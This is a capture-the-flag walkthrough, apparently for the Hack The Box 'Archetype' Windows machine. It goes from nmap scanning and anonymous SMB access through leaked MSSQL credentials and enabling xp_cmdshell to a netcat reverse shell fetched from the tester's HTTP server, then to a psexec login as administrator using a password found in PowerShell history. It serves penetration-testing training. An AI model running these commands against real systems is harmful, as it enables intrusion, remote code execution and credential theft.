# Archetype
#startingpoint 
#veryeasy 
#smb 
#windows 
#mssql
### Reconnaissance
The first phase of the penetration test involved reconnaissance to gather information about the target system. Nmap was used to scan the target system and identify open ports and services. The results showed that the system had several open ports, including SMB and MSSQL ports.

The following commands were used for reconnaissance `nmap -sV -p- $TARGET`, here we have the original output:

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-21 15:15 CET
Nmap scan report for 10.129.52.112
Host is up (0.065s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.49 seconds
```

### SMB Service
We start by checking all the available shares on SMB, to do this we run  `smbclient -N -L ////${TARGET}//`
```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

After testing which of them allow us to enter without the need of a password we realize we can enter the backups share with the following command `smbclient  //${TARGET}/backups`

```
smb: \> ls
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

		5056511 blocks of size 4096. 2545689 blocks available

smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1,3 KiloBytes/sec) (average 1,3 KiloBytes/sec)
```
We only see a file so we download it and check its contents `cat prod.dtsConfig`
```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>%
```
Inside this configurations we can find a user ID and the associated password.
Password: `M3g4c0rp123`
User ID: `ARCHETYPE/sql_svc`
### MSSQL Protocol

Now that we have MSSQL credentials, we can go inside the database to check the contents by running `impacket-mssqlclient ARCHETYPE/sql_svc@${TARGET}  -windows-auth`
```
Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```
Once in check, we check the rol of the account we are currently using
```
SQL> SELECT is_srvrolemember('sysadmin');
              

-----------   

          1 
```
Since we are admin we try to run cmd commands

```
SQL> EXEC xp_cmdshell 'net user';
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

```
The current settings doesn't allow us to do so, but as we are admin we are allowed to change that setting.
```
SQL> EXEC sp_configure 'show advanced options', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> sp_configure;
...

SQL> EXEC sp_configure 'xp_cmdshell', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;

```

Now we are able to run system commands
```
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL 
```

We download the nc64.exe utility to upload it to the server to get the reverse shell we want, to upload it we start a HTTP server with `sudo python3 -m http.server 80`
```
SQL> xp_cmdshell "powershell -c pwd"
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

Path                                                                               

----                                                                               

C:\Windows\system32                                                                

NULL                                                                               

NULL                                                                               

NULL                                                                               


```
We need to save the exe in a folder where we are able to write so we choose the Downloads folder to download the nc64
```
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.169/nc64.exe -outfile nc64.exe"
output                                                                             

--------------------------------------------------------------------------------   

NULL
```
Before starting the reverse shell we start the local listener `sudo nc -lvnp 443`
Once the listener is established we launch the connection `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.169 443"`

Now with the reverse shell we can find the user flag in the user desktop

### Privilege escalation
One common way to search possible privilege escalation ways is the use of the automated tools LinPeas for Linux based systems and WinPeas for windows based systems, so we download WinPeas, to upload we can repeat the same steps done before running in local `sudo python3 -m http.server 80` and in the server `powershell -c wget http://10.10.14.169/winPEASx64.exe -outfile winPEASx64.exe`
After executing the tool the following output is shown
```
�����������������������������������͹ System Information �������������������������������������

����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
    Hostname: Archetype
    ProductName: Windows Server 2019 Standard
    EditionID: ServerStandard
    ReleaseId: 1809
    BuildBranch: rs5_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 11/21/2023 8:17:53 AM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB5004335, KB5003711, KB5004244, 
    
����������͹ Current Token privileges
� Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

����������͹ Clipboard text

����������͹ Logged users
    NT SERVICE\SQLTELEMETRY
    ARCHETYPE\sql_svc

����������͹ Ever logged users
    NT SERVICE\SQLTELEMETRY
    ARCHETYPE\Administrator
    ARCHETYPE\sql_svc

����������͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\sql_svc\Downloads\winPEASx64.exe": sql_svc [AllAccess]
     File Permissions "C:\Users\sql_svc\Downloads\nc64.exe": sql_svc [AllAccess]

����������͹ Looking for Linux shells/distributions - wsl.exe, bash.exe

����������͹ Analyzing Windows Files Files (limit 70)
    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    C:\Users\Default\NTUSER.DAT
    C:\Users\sql_svc\NTUSER.DAT
```

It seems that we can access the commands history located on `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

```
more ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```
We found the administrator credentials so we login as so `impacket-psexec administrator@${TARGET}`
```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.52.112.....
[*] Found writable share ADMIN$
[*] Uploading file reUCRdoH.exe
[*] Opening SVCManager on 10.129.52.112.....
[*] Creating service PAWg on 10.129.52.112.....
[*] Starting service PAWg.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.
```
Once inside we check the account 
```
C:\Windows\system32>whoami
nt authority\system
```

The admin flag is inside the admin desktop

```
C:\Users\Administrator\Desktop>more root.txt
b91ccec3305e98240082d4474b848528
```